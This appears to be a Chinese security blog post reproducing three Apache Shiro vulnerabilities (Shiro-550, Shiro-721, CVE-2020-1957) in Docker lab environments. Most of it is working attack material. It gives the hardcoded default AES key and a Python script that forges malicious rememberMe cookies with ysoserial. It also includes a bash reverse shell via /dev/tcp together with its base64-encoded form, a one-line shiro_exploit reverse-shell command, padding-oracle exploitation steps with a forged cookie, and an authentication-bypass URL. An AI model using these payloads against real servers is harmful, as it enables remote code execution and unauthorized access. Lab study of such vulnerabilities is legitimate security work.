---
title: Shiro漏洞复现
top: false
cover: true
toc: true
mathjax: true
summary:
  - 'Shiro-550,Shiro-721 and  CVE-2020-1957'
tags:
  - 博客
categories:
  - 靶场：Vulhub-Shiro
abbrlink: 51574
date: 2021-10-16 14:08:02
password:
---

> 前面那篇博客介绍了这几个漏洞如何发现，接下来这几篇博客将对这几个漏洞进行复现，包括新增加的一些漏洞版本。

### *Shiro* *rememberMe*反序列化漏洞（*Shiro-550*）

- #### 漏洞原理

   浅显来说，shiro在登录处提供了Remember Me这个功能，来记录用户登录的凭证，然后shiro使用了CookieRememberMeManager类对用户的登陆凭证，也就是Remember Me的内容进行一系列处理：

   ​		**使用Java序列化 ---> 使用密钥进行AES加密 ---> Base64加密 ---> 得到加密后的Remember Me内容**

   同时在识别用户身份的时候，需要对Remember Me的字段进行解密，解密的顺序为：

   ​		**Remember Me加密内容 ---> Base64解密 ---> 使用密钥进行AES解密 --->Java反序列化**

   问题出在**AES加密的密钥Key被硬编码在代码里**，这意味着攻击者只要通过源代码找到AES加密的密钥，就可以构造一个恶意对象，对其进行序列化，AES加密，Base64编码，然后将其作为cookie的Remember Me字段发送，Shiro将RememberMe进行解密并且反序列化，最终造成反序列化漏洞。

- #### 影响版本

   ​	Apache Shiro < 1.2.4

- #### 特征判断

   ​	返回包中包含*rememberMe=deleteMe*字段。

- #### 如何利用

  ​	整体流程就是：命令 => 序列化 =>AES加密 => base64编码 => RememberMe Cookie值 => base64解密 => AES解密 => 反序列化 => 执行命令

- #### **漏洞利用**

   - ##### 环境搭建

      ​	如前一篇博客所说，不再赘诉。

   - ##### 工具准备

     ​	maven配置

     ```shell
     	#下载
     sudo wget  https://mirrors.tuna.tsinghua.edu.cn/apache/maven/maven-3/3.6.3/binaries/apache-maven-3.6.3-bin.tar.gz
     #解压移动
     tar -zxvf apache-maven-3.6.3-bin.tar.gz
     sudo mv apache-maven-3.6.3 /usr/local/maven3
     #在/etc/profile末尾添加maven环境变量:
     export M2_HOME=/usr/local/maven3
     export PATH=$PATH:$JAVA_HOME/bin:$M2_HOME/bin
     #启动配置
     source /etc/profile
     ```

     ​		下载*ysoserial*并打包

     ```shell
     #下载
     git clone https://github.com/frohoff/ysoserial.git
     #打包
     cd ysoserial
     mvn package -D skipTests
     ```

     ![](http://r02y8mxs0.hb-bkt.clouddn.com/blog/202110161439078.png)

     ​	生成的工具在ysoserial/target文件中。

   - **漏洞利用**

     ​	 我们先用浏览器访问`http://172.17.0.1:8080`，通过*burpsuite*的重放功能进行查看特征字段![](http://r02y8mxs0.hb-bkt.clouddn.com/blog/202110161446443.png)

     ​	 检查是否存在默认的key。使用Shiro_exploit，获取key

     ​	` git clone https://github.com.cnpmjs.org/insightglacier/Shiro_exploit.git`

     ​	`python shiro_exploit.py -u http://172.17.0.1:8080`

     ![](http://r02y8mxs0.hb-bkt.clouddn.com/blog/202110161453262.png)

     ​	nc反弹shell

     1. 首先监听本地端口`nc -nvlp 4444`

     2. Java Runtime 配合 bash 编码，
        在线编码地址：http://www.jackson-t.ca/runtime-exec-payloads.html

        ```shell
        #输入
        bash -i >& /dev/tcp/10.0.2.15/4444 0>&1
        #输出
        bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4wLjIuMTUvNDQ0NCAwPiYx}|{base64,-d}|{bash,-i}
        ```

     3. 通过ysoserial中JRMP监听模块，监听5555端口并执行反弹shell命令。

        ```shell
        java -cp ysoserial-0.0.6-SNAPSHOT-all.jar ysoserial.exploit.JRMPListener 5555 CommonsCollections4 'bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4wLjIuMTUvNDQ0NCAwPiYx}|{base64,-d}|{bash,-i}'
        ```

        ​	![](http://r02y8mxs0.hb-bkt.clouddn.com/blog/202110161524359.png)

     4. 编写shiro.py如下

        ```python
        import sys
        import uuid
        import base64
        import subprocess
        from Crypto.Cipher import AES
        def encode_rememberme(command):
            popen = subprocess.Popen(['java', '-jar', 'ysoserial-0.0.6-SNAPSHOT-all.jar', 'JRMPClient', command], stdout=subprocess.PIPE)
            BS = AES.block_size
            pad = lambda s: s + ((BS - len(s) % BS) * chr(BS - len(s) % BS)).encode()
            key = base64.b64decode("kPH+bIxk5D2deZiIxcaaaA==")
            iv = uuid.uuid4().bytes
            encryptor = AES.new(key, AES.MODE_CBC, iv)
            file_body = pad(popen.stdout.read())
            base64_ciphertext = base64.b64encode(iv + encryptor.encrypt(file_body))
            return base64_ciphertext
        
        if __name__ == '__main__':
            payload = encode_rememberme(sys.argv[1])   
        print "rememberMe={0}".format(payload.decode())
        ```

     5. 使用shiro.py 生成Payload`python shiro.py 10.0.2.15:5555`![](http://r02y8mxs0.hb-bkt.clouddn.com/blog/202110161629323.png)

     6. 可能存在的问题

        ​	`ImportError: No module named Crypto.Cipher`网上找了很多方法都没能解决。最后手动安装模块解决

        ​	下载地址`https://pypi.org/simple/pycrypto/`下载网成功后进入页面使用`sudo python setup.py build`进行编译`sudo python setup.py install`进行安装。

     7. 构造数据包，伪造cookie，发送Payload.

        ![](http://r02y8mxs0.hb-bkt.clouddn.com/blog/202110161712951.png)

     8. nc接听端口成功![](http://r02y8mxs0.hb-bkt.clouddn.com/blog/202110161846151.png)
     
     9. 如果只是想简单的获得反弹shell可以执行以下命令即可获得
     
        ```shell
        python3 shiro_exploit.py -t 3 -u http://10.0.2.15:8080 -p "bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4wLjIuMTUvNDQ0NCAwPiYx}|{base64,-d}|{bash,-i}"
        
        ```

### *Shiro Padding Oracle Attack*（*Shiro-721*）

- #### 漏洞原理

  ​	由于Apache Shiro cookie中通过 AES-128-CBC 模式加密的rememberMe字段存在问题，用户可通过Padding Oracle 加密生成的攻击代码来构造恶意的rememberMe字段，并重新请求网站，进行反序列化攻击，最终导致任意代码执行。

  ​	**Padding Oracle Attack（填充提示攻击）**
  ​           如果输入的密文不合法，类库则会抛出异常，这便是一种提示。攻击者可以不断地提供密文，让解密程序给出提示，不断修正，最终得到的所需要的结果。只根据我们输入的初始向量值和服务器的状态去判断出解密后明文的值，padding oracle attack 就是通过验证解密时产生的明文是否符合 padding 的原则，来判断解密是否成功的。这里的攻击即叫做 Padding Oracle Attack 攻击。

  利用 Padding Oracle 能够在不知道密钥的情况下，解密任意密文，或者构造出任意明文的合法密文。

- #### *影响版本*

  ​	Apache Shiro < 1.4.2版本。

- #### 如何利用

  ​	获取 rememberMe的 的值 => Base64 解码 => AES-128-CBC 解密 => 反序列化

- #### 漏洞利用

  - ##### 靶场搭建

    ```shell
    #下载
    git clone https://github.com/3ndz/Shiro-721.git
    #编译
    cd Shiro-721/Docker
    sudo docker build -t shiro-721 .
    #启动并将端口8080映射到主机端口8080上
    docker run -p 8080:8080 -d shiro-721
    #查看
    docker ps
    ```

    可以通过自行编译1.4.1war 包放入tomcat容器中运行

    ```shell
    #添加阿里云镜像
    sudo vi /usr/local/maven3/conf/settings.xml
    #在<mirror>中添加如下代码
    <mirror>
          <id>alimaven</id>
          <name>aliyun maven</name>
          <url>http://maven.aliyun.com/nexus/content/groups/public/</url>
          <mirrorOf>central</mirrorOf>        
    </mirror>
    ```

    可从 Apache Shiro Gtihub 官方仓库自行下载漏洞影响版本(https://github.com/apache/shiro)，使用 Apache Maven(软件项目管理及自动构建工具) 编译构建生成 war Java 应用程序包。

    ```shell
    #下载
    git clone https://github.com/apache/shiro.git
    #安装
    cd shiro
    git checkout shiro-root-1.4.1
    mvn install
    #以下几项执行完成以后即可暂停
    [INFO] Apache Shiro ....................................... SUCCESS [  1.630 s]
    [INFO] Apache Shiro :: Core ............................... SUCCESS [ 46.175 s]
    [INFO] Apache Shiro :: Web ................................ SUCCESS [  3.571 s]
    #进而编译 samples/web
    cd samples/web
    mvn install
    ```

    将编译完成获取到的 samples-web-1.4.1.war 包( samples/target/中）拷贝到 Tomcat 的 webapps 目录下，启动tomcat即可。

    这里已编号war包：

    ```shell
    git clone https://github.com/backlion/demo/blob/master/samples-web-1.4.1.war
    ```

    将war包拷贝到docker tomcat容器中的webasps目录下之后打开http://192.168.1.9:8080/samples-web-1.4.1/

    ​	![](http://r02y8mxs0.hb-bkt.clouddn.com/blog/202110161941729.png)

  - ##### 漏洞利用

    ​	登录 Shiro 测试账户获取合法 Cookie（勾选Remember Me）：

    ![](http://r02y8mxs0.hb-bkt.clouddn.com/blog/202110161944437.png)

    认证失败时（输入错误的用户名和密码），http响应页面中会显示出deleteMe的cookie:

    ![](http://r02y8mxs0.hb-bkt.clouddn.com/blog/202110161944163.png)

    认证成功（输入正确的用户名和密码登录），http响应页面中不会显示deleteMe的cookie:

    ![](http://r02y8mxs0.hb-bkt.clouddn.com/blog/202110161944095.png)

    根据以上条件我们的思路是在正常序列化数据（需要一个已知的用户凭证获取正常序列化数据）后利用 Padding Oracle 构造我们自己的数据（Java序列化数据后的脏数据不影响反序列化结果），此时会有两中情况:

    1. 构造的数据不能通过字符填充验证，返回deleteme;
    2. 构造的数据可以成功解密通过字符填充验证，之后数据可以正常反序列化，不返回deleteme的cookie.

    这里输入正确的用户名和密码，并勾选Remeber ME。

    ![](http://r02y8mxs0.hb-bkt.clouddn.com/blog/202110161944320.png)

    登录成功后，访问http://192.168.1.14:8080/account/，并通过burp对其进行抓包，得到Cookie中的rememberMe值

    ![](http://r02y8mxs0.hb-bkt.clouddn.com/blog/202110161945111.png)

    使用Java反序列化工具 ysoserial 生成 Payload:

    ```shell
    #这里可以生成在目标靶机中创建/tmp/test的payload
    java -jar ysoserial-master-6eca5bc740-1.jar  CommonsCollections1 'touch /tmp/test' > payload.class 
    ```

    通过git对其padding oracle attack poc进行下载

    ```shell
    git clone https://github.com/wuppp/shiro_rce_exp.git
    ```

    

    通过 Padding Oracle Attack 生成 Evil Rememberme cookie:

    注意： 此 exp 爆破时间较长，建议使用 ysoserial 生成较短的 payload 验证（如： ping 、 touch /tmp/test等），约 1 个多小时可生成正确的 rememberme cookie，生成成功后将自动停止运行。

    ```shell
     #复制
     cp payload.class shiro_rce_exp/
     #进入文件夹
     cd shiro_rce_exp/
     #爆破
     python shiro_exp.py http://192.168.1.14:8080/account/ HZ717RwZHZHuR/x9yMmjJUUGWXLAOiZx01rXghAir47/Xbu++kfYFiJA7gQcSn6oaBqcRXfkihooScqykI8FEWlqmN6agAJr3bh5QH+WshypvevVnsEvUDDaSTCEX8tr3seRX8TAJfuNyvK/DD1HHYdgEKZZ9XbbimYH8S7+Xsv0uzx8PH0OuIiFX3HAofmx5y4cvRpYove0NU+/QaRwZV2LoWtAi0adC/vCHb1H2ochg5LBel6jEQakIP3AmYkEOqfRTRl/sm1olkPM+sFk6+lGw9UtDvWqCCqK5fopXV+0n4qCJlyoNyWdVEmm+mZbxekimV3QDdlC75kuyv9Utw9VtOGMdeyBttl8YrXJCJEFEdIN22LxA//iqnyGjltUEljFrZhTXXhml/V8oPVnXFOAmygIaFD6uv9rWnTtPBlLOblusyElga20ngvoMOVKTu3uYHV0Hmiw/gcnT1yT0ZosI2/fe+dzmbVNyGrwKktYjEobCZIIz/U4intWvQ77  payload.class
    ```

    ![](http://r02y8mxs0.hb-bkt.clouddn.com/blog/202110161948586.png)

    ```shell
    #rememberMe cookies:
    Sr3FrVSmz48Tz+k5ZQxUbvAoyEOxk73bEOKUZgvK/W4U8sTEwzhUiU5YwS5HLZb5qe40REONqDBiDxiDz53NCLz7Xz57yorDiuvzRzfosivcjVjhSBfqcRGGRzEoaUGoI7LDb1Cn9pJIz/1xoyL5AcX05T2tfOwpY9u1crUWM28Xh5bY+Us50UQe7mrrDRAhefjETO7VudSkBpf7+KPVmbvPilkMuF153B/YjoAs1qQPDv2bBfS+H9BxILf4vRbhWmVLZnq/mj0t4d3MPhLV6vrtGCp0OjLFvDkPz5MlEk1uAlJjM5YZebvFR2Akei7YI4Xz0pWBs1j7cvq6f5J++ysiPC/lHtWgTY7WLcTTxxJXcGOGPT9N4KZAwpqCjQQbgm4fWGxaci778eWkTWbxqRS7nmfy/UX4P1trwloHdJhB69Pu7qorHUalpDR0YcWbiBc/VuAvOhoutKCW0LjQOjKyJsGj/6nMKTJ98ZG2sG52R5OHp7ELaB7BK+xn4v8e7KNlcCq41VMQyz++qFtDCvSB8kCfgPETF39eEVB4s2ZLwr0OQBViaeszAUIsJjCkaxYADnlt2Sy9wQ8OwSx05VdcuCWjD1q+WjWFePOoQIAxCQiJmHN8G+f609Hj4GlmNYDGsOVIl7J+JWt2ri4HEICHxeflP6e+ALb/UEYGxvRHs11VCNf35usHwyxEFD3VKGFYZ86StRK7czORGSv6jRBjOu3LsWfoHEEElQRQ8CZpSfaPahuKhrkZeVKpQ+14tllU6NtPrM64ytCTr0kXlcLJCAZF8YEy6/iYwFyVVbymNrUoE1nAF3RgzZU8WMvy/yJzFQZm87Lod50r66EC+Y2BANo2rGmo02gQIif/M8SHWXakKp6hnO9iTK37JuSRp4XakH2HubjsfvZtN8KNaAGKIGAxCMRt8w4/duMZHKrKnmoxd9CiGUHjbgj1oP29Fz3OHnqah7sZjHbAw5QZuh+6pgbkb+U9WikFQjISbsJzBm+3MRt0hN2rnbjMvBJmo6Z+FuUZYQNmLo93pDflsYhvYaKcL8Ji3KIcU1v/zC4shbe2WS1CojtV9fNAnJ8rO9cHXC4pfGkbIe1ZLckSS3JWwMtC34X+D+JVuNl6v+03sWvAjCIEoOxL5s0+kqq7QD0B9te7n47UqaAoyH6Ok6O+sTz21zp8W2oDg6iCiWA3njB3ZKp9WhPNgT1qiJcwPcH1mDFJZtMkfBcDFeOQXBr1X253IZImsPC0LkKJZBI2dkgysy0jnLs5gKa9cebfZyJQkRQuFtpa7obu+Fs40ICStzuKoIm7dtZO6Yo6dxRTNWDbZYopt53YcvtSiXVjoi3XR7Qymlm01BHLgzZvF17ANT9H5KXgjfM6Ct6xjFEfHUl+DxevS/GOeSwOzCeoBN5n9UvjopnGoZGrnRw/XaeU+3UpFb+kRI4pr60vm/J9u2KSYrvLSr573vQ7j438J9GSP9yQ0x4XeRKz6PpM4ntaqwPt8gKSPKnVkAeUPb6ocDD1O6lhg3FurZ7WgB3qj90pVzStXRzHDeTkbOCgAZzxOwoH8TuA0TkW3NVSVg1OMAspYhGDiOtFznnOc3ES8D5KzPyThas0eGvrmzPGpWLtK1cfrZEwgmndJFoK3f1rV7Y2FghM56Zl9xhFodS4Cjv9HgzRsBIMtrF57pbftvvBOoBNRvkg2WLMK2+ruzD90dNHypvBTlmyMWFVSeGGWYkeeNgCAzrWF/LpkTSfxCRwe0dhUkFXEYlYksTWZgmWU4haiIifz7+dpm/tME/BZhzbIVRYwraYYydyN34ODw/RJN+LSsL0XRFb0xPWjuIEn4Cselz1XOt/XO0D5G2NZ8vjVBp0mArwp4GtN6ISvgAAAAAAAAAAAAAAAAAAAAA=
    ```

      使用Evil Rememberme cookie 认证进行反序列化攻击：复制该cookie，然后重放一下数据，即可成功执行命令

    ![img](https://img2020.cnblogs.com/blog/1049983/202012/1049983-20201203093823489-197308072.png)


    检查一下执行结果，可以看到成功创建了一个test文件

    

    ```
    docker exec -it  3f2fb81c0d93 /bin/bash
    
     ls
    ```

    ![](http://r02y8mxs0.hb-bkt.clouddn.com/blog/202110161949493.png)

### *Apache Shiro* 认证绕过漏洞 *CVE-2020-1957*

- #### 漏洞原理

  ​	CVE-2020-1957，Spring Boot中使用 Apache Shiro 进行身份验证、权限控制时，可以精心构造恶意的URL，利用 Apache Shiro 和 Spring Boot 对URL的处理的差异化，可以绕过 Apache Shiro 对 Spring Boot 中的 Servlet 的权限控制，越权并实现未授权访问。

- #### 影响版本

  ​	Apache Shiro < 1.5.1

- #### 漏洞利用

  - ##### 搭建靶场

    ```shell
    #进入
    cd vulhub/shiro/CVE-2020-1957
    #搭建
    sudo docker-compose up -d
    ```

  - **url权限**

    ```shell
    @Bean public ShiroFilterChainDefinition shiroFilterChainDefinition() {     DefaultShiroFilterChainDefinition chainDefinition = new DefaultShiroFilterChainDefinition();     chainDefinition.addPathDefinition("/login.html", "authc"); // need to accept POSTs from the login form     chainDefinition.addPathDefinition("/logout", "logout");     chainDefinition.addPathDefinition("/admin/**", "authc");     return chainDefinition; } 
    ```

    

  - ##### **浏览器访问admin目录，使用burpsuite抓包**![](http://r02y8mxs0.hb-bkt.clouddn.com/blog/202110162018085.png)

  - 换成/xxx/..;/admin/![](http://r02y8mxs0.hb-bkt.clouddn.com/blog/202110162023359.png)

    成功



